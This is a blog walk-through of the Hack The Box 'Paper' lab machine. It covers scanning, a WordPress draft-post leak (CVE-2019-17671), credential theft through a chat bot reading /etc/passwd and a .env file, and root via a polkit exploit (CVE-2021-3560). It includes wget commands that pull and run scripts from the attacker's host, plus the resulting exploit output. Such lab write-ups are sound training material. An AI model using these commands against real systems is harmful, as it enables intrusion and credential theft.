# Paper HTB Machine Walk-Through!

---

### Paper HTB Machine Walk-Through!

### Executive Summary

This assessment of the ***“Paper”*** machine began with identifying an **HTTP** header leak that exposed a hidden internal blog, **`office.paper`**, effectively bypassing the default landing page. Exploiting an unpatched WordPress vulnerability **(CVE-2019-17671)** revealed confidential **"Draft"** posts, which leaked credentials and an invitation to an internal Rocket.Chat server. Inside the chat environment, I compromised a custom bot that lacked input sanitization to achieve Remote Code Execution **(RCE)** and gain an initial foothold on the system. Finally, I escalated privileges to Root by exploiting a known race condition in the system's **`polkit`** service **(CVE-2021-3560)**, demonstrating how a chain of minor misconfigurations can lead to total system compromise.

> <a href="https://medium.com/@nmullenski05102016/paper-htb-machine-walk-through-8edec7583475?sk=f079e75d54614a67ddf0f4f18f64c6a0" class="markup--anchor markup--pullquote-anchor" data-href="https://medium.com/@nmullenski05102016/paper-htb-machine-walk-through-8edec7583475?sk=f079e75d54614a67ddf0f4f18f64c6a0" target="_blank">**If you’re not a member Click Here to read Full-Story**</a>

> **Nmap Scan**

```
┌──(nicholas㉿achilles)-[~/HTB/Labs/paper]
└─$ nmap -sV -sC -A -vvv -p- 10.10.11.143
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-10 19:59 EST
NSE: Loaded 157 scripts for scanning.

<SNIP>

Nmap scan report for 10.10.11.143
Host is up, received echo-reply ttl 63 (0.045s latency).
Scanned at 2025-12-10 19:59:02 EST for 81s
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcZzzauRoUMdyj6UcbrSejflBMRBeAdjYb2Fkpkn55uduA3qShJ5SP33uotPwllc3wESbYzlB9bGJVjeGA2l+G99r24cqvAsqBl0bLStal3RiXtjI/ws1E3bHW1+U35bzlInU7AVC9HUW6IbAq+VNlbXLrzBCbIO+l3281i3Q4Y2pzpHm5OlM2mZQ8EGMrWxD4dPFFK0D4jCAKUMMcoro3Z/U7Wpdy+xmDfui3iu9UqAxlu4XcdYJr7Iijfkl62jTNFiltbym1AxcIpgyS2QX1xjFlXId7UrJOJo3c7a0F+B3XaBK5iQjpUfPmh7RLlt6CZklzBZ8wsmHakWpysfXN
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE/Xwcq0Gc4YEeRtN3QLduvk/5lezmamLm9PNgrhWDyNfPwAXpHiu7H9urKOhtw9SghxtMM2vMIQAUh/RFYgrxg=
|   256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKdmmhk1vKOrAmcXMPh0XRA5zbzUHt1JBbbWwQpI4pEX
80/tcp  open  http     syn-ack ttl 63 Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-title: HTTP Server Test Page powered by CentOS
| http-methods:
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
443/tcp open  ssl/http syn-ack ttl 63 Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-title: HTTP Server Test Page powered by CentOS
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US/emailAddress=root@localhost.localdomain
| Subject Alternative Name: DNS:localhost.localdomain
| Issuer: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US/organizationalUnitName=ca-3899279223185377061/emailAddress=root@localhost.localdomain
|
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
| http-methods:
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
TCP/IP fingerprint:

Uptime guess: 40.802 days (since Fri Oct 31 01:45:24 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using port 993/tcp)
HOP RTT      ADDRESS
1   43.40 ms 10.10.14.1
2   43.69 ms 10.10.11.143

<SNIP>

Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.02 seconds
           Raw packets sent: 66601 (2.931MB) | Rcvd: 65835 (2.634MB)
```

### 1. Analysis of Scan Results

- <span id="98ba">**Ports 80 (HTTP) & 443 (HTTPS):** Both are open and running **Apache 2.4.37** on **CentOS**.</span>
- <span id="be49">**The “Default Page” Clue:** The key takeaway from my scan is the **`http-title: HTTP Server Test Page powered by CentOS`**.</span>
- <span id="11ce">This usually means the web server is configured to serve content based on the **Hostname** you request. Since you accessed it via **IP** address (which has no hostname), it gave us the default **“I’m alive”** page.</span>
- <span id="d485">We need to find the correct domain names (***Virtual Hosts***) to see the actual website.</span>

> **Web Enumeration**

### 1. The Command

`curl -I 10.10.11.143`

- <span id="0b32">**`curl`**: (Client URL) A command-line tool used to transfer data to or from a server. It is the standard tool for talking to web servers manually.</span>
- <span id="daea">**`-I`** **(or** **`--head`)**: This is the specific flag you used. It tells curl: **"Do not download the website body (the HTML code). Just fetch the HTTP Headers."**</span>
- <span id="fc06">*Why use it?* It is much faster than downloading the whole page, and it is perfect for reconnaissance when you just want to see *how* the server identifies itself without alerting it too much or filling your screen with HTML.</span>

```
┌──(nicholas㉿achilles)-[~/HTB/Labs/paper]
└─$ curl -I 10.10.11.143
HTTP/1.1 403 Forbidden
Date: Thu, 11 Dec 2025 01:05:02 GMT
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
X-Backend-Server: office.paper
Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT
ETag: "30c0b-5c5c7fdeec240"
Accept-Ranges: bytes
Content-Length: 199691
Content-Type: text/html; charset=UTF-8
```

**X-Backend-Server:** office.paper. So we need to add that to our host file.

```
sudo nano /etc/hosts

10.10.11.143 office.paper paper.htb
```

Now let’s Check the website to see what is operating on there.

![](https://cdn-images-1.medium.com/max/800/1*9lpStz4H_32bZmXmlI3jNQ.png)

![](https://cdn-images-1.medium.com/max/800/1*Cuqh3-eGHHCwxHbxO_papw.png)

Well we see that it is a blog and it is powered by Wordpress!

![](https://cdn-images-1.medium.com/max/800/1*hH1MMhYHL4Ib2o2Qu5QAig.png)

WordPress version 5.2.3

```
┌──(nicholas㉿achilles)-[~/HTB/Labs/paper]
└─$ wpscan --url http://office.paper --no-update --enumerate p,u --random-user-agent
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://office.paper/ [10.10.11.143]
[+] Started: Wed Dec 10 21:04:42 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
 |  - X-Powered-By: PHP/7.2.24
 |  - X-Backend-Server: office.paper
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://office.paper/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-04).
 | Found By: Rss Generator (Passive Detection)
 |  - http://office.paper/index.php/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>
 |  - http://office.paper/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>

[+] WordPress theme in use: construction-techup
 | Location: http://office.paper/wp-content/themes/construction-techup/
 | Last Updated: 2022-09-22T00:00:00.000Z
 | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1
 | Style Name: Construction Techup
 | Description: Construction Techup is child theme of Techup a Free WordPress Theme useful for Business, corporate a...
 | Author: wptexture
 | Author URI: https://testerwp.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1, Match: 'Version: 1.1'

[+] Enumerating Most Popular Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:02 <==> (10 / 10) 100.00% Time: 00:00:02

[i] User(s) Identified:

[+] prisonmike
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://office.paper/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] nick
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://office.paper/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] creedthoughts
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Dec 10 21:04:53 2025
[+] Requests Done: 58
[+] Cached Requests: 6
[+] Data Sent: 15.652 KB
[+] Data Received: 254.476 KB
[+] Memory used: 260.836 MB
[+] Elapsed time: 00:00:11
```

### The Vulnerability: WordPress CVE-2019–17671

![](https://cdn-images-1.medium.com/max/800/1*Vg9n_D---fPHwn9YekwVMA.png)

#### Executive Summary

**What is it?** **CVE-2019–17671** is a critical security flaw in WordPress versions 5.2.3 and older. It allows unauthorized users to view content that was explicitly hidden, such as ***“Private”*** or ***“Draft”*** posts, without logging in.

**Why does it matter?** Organizations often draft sensitive announcements, internal policies, or even share credentials in private posts before they are published. A malicious actor could exploit this vulnerability to steal confidential information, effectively bypassing the website’s access controls. In this assessment, this specific flaw leaked a registration link to the internal chat system, serving as the primary entry point for the attack.

#### Technical Breakdown

**The Mechanism:** The vulnerability resides in how the **`WP_Query`** class handles SQL queries when specific parameters are passed in the URL.

- <span id="4357">**The Flaw:** When a user requests a WordPress page, the system builds a database query to fetch content. In vulnerable versions, if an attacker appends the parameter **`?static=1`** to the URL, it modifies the query logic.</span>
- <span id="6d05">**The Bypass:** The **`static=1`** parameter forces WordPress to retrieve posts regardless of their publication status (e.g., Draft, Pending, Private).</span>
- <span id="c999">**The Logic Error:** Typically, WordPress checks if a user has the correct permissions (like an Admin or Editor cookie) before showing non-public posts. However, due to this bug, the check is skipped or improperly evaluated when **`static=1`** is present, causing the server to render the private content to any unauthenticated visitor.</span>

**Exploit Example:**

- <span id="4bd0">**Normal URL:** **`http://office.paper/`** (Shows only published posts)</span>
- <span id="5016">**Exploit URL:** **`http://office.paper/?static=1`** (Forces the server to display *all* posts, including secrets)</span>

![](https://cdn-images-1.medium.com/max/800/1*hHkDnQaZ0ZAn61dlNoTQBQ.png)

Let’s add chat.office.paper to our host file and visit our foothold. Takes us to a Rocketchat site register with your information and enumerate the website

> Foothold

![](https://cdn-images-1.medium.com/max/800/1*Sbti1wwsjGJnJSgDolXrYQ.png)

After signing in a Chat will open up on the left side in there we will find our foothold into this machine!

![](https://cdn-images-1.medium.com/max/800/1*kwK2UPXX-Y3WLg3CIpAd0g.png)

![](https://cdn-images-1.medium.com/max/800/1*eVnchwl_AIFtD2ozOHwx1Q.png)

After conducting several controlled test interactions with the chatbot interface, I was able to successfully enumerate the contents of the **/etc/passwd** file. The output confirmed that the system hosts only a single local user account Dwight, in addition to the default ***rocketchat*** service user. This indicates a relatively minimal user footprint on the underlying host, which can simplify privilege‑escalation analysis and reduce the overall attack surface.

![](https://cdn-images-1.medium.com/max/800/1*ZBX4ODbBBx3HlEPoDe061g.png)

![](https://cdn-images-1.medium.com/max/800/1*HyCx26DFegnDX5YCYn5R9Q.png)

![](https://cdn-images-1.medium.com/max/800/1*vfXltmMCqBX5W89o0A_w1g.png)

![](https://cdn-images-1.medium.com/max/800/1*KKabP7nQHsvyibVxMwsP0w.png)

After identifying the presence of the user Dwight, I expanded my enumeration efforts to gather additional context around this account. That deeper inspection paid off. While reviewing the Hubot-related directories, I located a ***.env*** file containing exposed environment variables, including credential material.\
These leaked credentials provide a valuable foothold for further testing. With proper authorization, they can be safely credential‑sprayed against the Dwight account to determine whether the same secrets are reused elsewhere in the environment.

![](https://cdn-images-1.medium.com/max/800/1*e-2nYu3kSHsSXRrpuFAPTQ.png)

![](https://cdn-images-1.medium.com/max/800/1*EgyMcbdTeG75Wt4ewAAsHw.png)

Using the recovered credentials, I validated access through SSH with netexec, which successfully authenticated as the user Dwight. With an interactive shell now established, the next step was to log in directly via SSH and verify local permissions.\
Once inside the environment as Dwight, I navigated through the user’s home directory and retrieved the **user.txt** flag, confirming full user‑level access on the target system.

![](https://cdn-images-1.medium.com/max/800/1*-p62kbxamYxa4hfmUzE0Gg.png)

![](https://cdn-images-1.medium.com/max/800/1*MwvF4vxJD0vJwsr1wiI_YQ.png)

> **Privilege Escalation**

Once I confirmed that linPEAS.sh was already available on my attacker machine, I copied it into my working directory and spun up a quick Python **http.server** to host it. From the victim machine, I used **wget** to pull the script down, adjusted the file permissions to make it executable, and then ran **linPEAS** to begin enumerating the system for privilege‑escalation vectors.

```

[dwight@paper ~]$ wget 10.10.14.19/linpeas.sh
--2025-12-12 21:39:13--  http://10.10.14.19/linpeas.sh
Connecting to 10.10.14.19:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 956174 (934K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 933.76K  1.10MB/s    in 0.8s

2025-12-12 21:39:14 (1.10 MB/s) - ‘linpeas.sh’ saved [956174/956174]

[dwight@paper ~]$ chmod +x linpeas.sh
[dwight@paper ~]$ ./linpeas.sh
```

```
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: less probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL:
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2019-13272] PTRACE_TRACEME

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903
   Exposure: less probable
   Tags: ubuntu=16.04{kernel:4.15.0-*},ubuntu=18.04{kernel:4.15.0-*},debian=9{kernel:4.9.0-*},debian=10{kernel:4.19.0-*},fedora=30{kernel:5.0.9-*}
   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/47133.zip
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c
   Comments: Requires an active PolKit agent.

Vulnerable to CVE-2021-3560

╔══════════╣ Protections
═╣ AppArmor enabled? .............. AppArmor Not Found
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... SELinux status:                 disabled
═╣ Seccomp enabled? ............... disabled
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (vmware)

╔══════════╣ Kernel Modules Information
══╣ Kernel modules with weak perms?

══╣ Kernel modules loadable?
Modules can be loaded
```

After testing an additional proof‑of‑concept for <a href="https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation.git" class="markup--anchor markup--p-anchor" data-href="https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation.git" rel="noopener" target="_blank">CVE‑2021‑3650</a>, I cloned the repository to my attacker machine. From there, I used the same file‑transfer workflow I established earlier with **linPEAS.sh** — moving the script into my working directory, hosting it with a lightweight Python **http.server**, and pulling it onto the target system using **wget** before adjusting permissions. With the <a href="https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation.git" class="markup--anchor markup--p-anchor" data-href="https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation.git" rel="noopener" target="_blank"><strong>POC</strong></a> in place, I proceeded to run it and observe the system’s behavior.

![](https://cdn-images-1.medium.com/max/800/1*7OHurX21H-1FV6K0_kqaYA.jpeg)

```
[dwight@paper ~]$ wget http://10.10.14.19/poc.sh
--2025-12-12 22:10:57--  http://10.10.14.19/poc.sh
Connecting to 10.10.14.19:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 9627 (9.4K) [text/x-sh]
Saving to: ‘poc.sh’

poc.sh               100%[======================>]   9.40K  --.-KB/s    in 0s

2025-12-12 22:10:57 (128 MB/s) - ‘poc.sh’ saved [9627/9627]

[dwight@paper ~]$ bash poc.sh

[!] Username set as : secnigma
[!] No Custom Timing specified.
[!] Timing will be detected Automatically
[!] Force flag not set.
[!] Vulnerability checking is ENABLED!
[!] Starting Vulnerability Checks...
[!] Checking distribution...
[!] Detected Linux distribution as "centos"
[!] Checking if Accountsservice and Gnome-Control-Center is installed
[+] Accounts service and Gnome-Control-Center Installation Found!!
[!] Checking if polkit version is vulnerable
[+] Polkit version appears to be vulnerable!!
[!] Starting exploit...
[!] Inserting Username secnigma...
Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
[+] Inserted Username secnigma  with UID 1005!
[!] Inserting password hash...
[!] It looks like the password insertion was succesful!
[!] Try to login as the injected user using su - secnigma
[!] When prompted for password, enter your password
[!] If the username is inserted, but the login fails; try running the exploit again.
[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell!
```

✅ Privilege Escalation & Root Compromise (Final Steps)\
With the proof‑of‑concept script transferred to the target, I executed it to test for the CVE‑2021‑3650 polkit vulnerability. The script performed a series of automated checks — confirming the distribution, validating the presence of AccountsService and GNOME components, and verifying that the installed polkit version was vulnerable.\
Once confirmed, the exploit attempted to inject a new local user. Despite an initial permission‑denied message, the script successfully created the user secnigma with a valid UID and inserted a password hash. This gave me a foothold to authenticate as the newly created account:

```
[dwight@paper ~]$ su - secnigma
Password:
```

After logging in, I verified group membership and confirmed that the user had been added to the wheel group, granting sudo privileges. From there, escalating to a root shell was straightforward:

```
[secnigma@paper ~]$ sudo bash
[sudo] password for secnigma:
```

With full root access obtained, I navigated to the directory and retrieved the final proof‑of‑completion flag for the lab environment.\
This confirmed successful exploitation of the privilege‑escalation vector and full compromise of the target system — closing out the pentest with a validated, reproducible attack chain.

```
[root@paper secnigma]# cat /root/root.txt
07dcc920e4128ca56ad87ecf4ba55a14
[root@paper secnigma]#
```

![](https://cdn-images-1.medium.com/max/800/1*0M6yscPwOFb55ZKdrTjsFg.jpeg)

### Join the Mission

I don’t want to do this alone. I want to build a community of people who are hungry to learn, build, and break things (ethically).

I am constantly looking for the next challenge.

- <span id="e923">Is there a specific tool you wish existed?</span>
- <span id="6370">Is there a hacking concept you want me to learn and explain?</span>
- <span id="9960">Do you have a “brick wall” you’re hitting in your own research?</span>

Jump into the server, drop a message, and tell me what I should build or learn next. Let’s sharpen each other.

<a href="https://discord.gg/3DH3MasSfN" class="markup--anchor markup--mixtapeEmbed-anchor" data-href="https://discord.gg/3DH3MasSfN" title="https://discord.gg/3DH3MasSfN"><strong>Join the Iron-Breach Discord Server!</strong><br />
<em>An advanced study group for Offensive Security professionals and students. We specialize in Red Teaming simulation…</em>discord.gg</a><a href="https://discord.gg/3DH3MasSfN" class="js-mixtapeImage mixtapeImage mixtapeImage--empty u-ignoreBlock" data-media-id="2798b0a5cd278d72b171b0c7596c909e"></a>

By <a href="https://medium.com/@nicholasmullenski" class="p-author h-card">Nicholas Mullenski</a> on [December 13, 2025](https://medium.com/p/8edec7583475).

<a href="https://medium.com/@nicholasmullenski/paper-htb-machine-walk-through-8edec7583475" class="p-canonical">Canonical link</a>

Exported from [Medium](https://medium.com) on September 1, 2026.
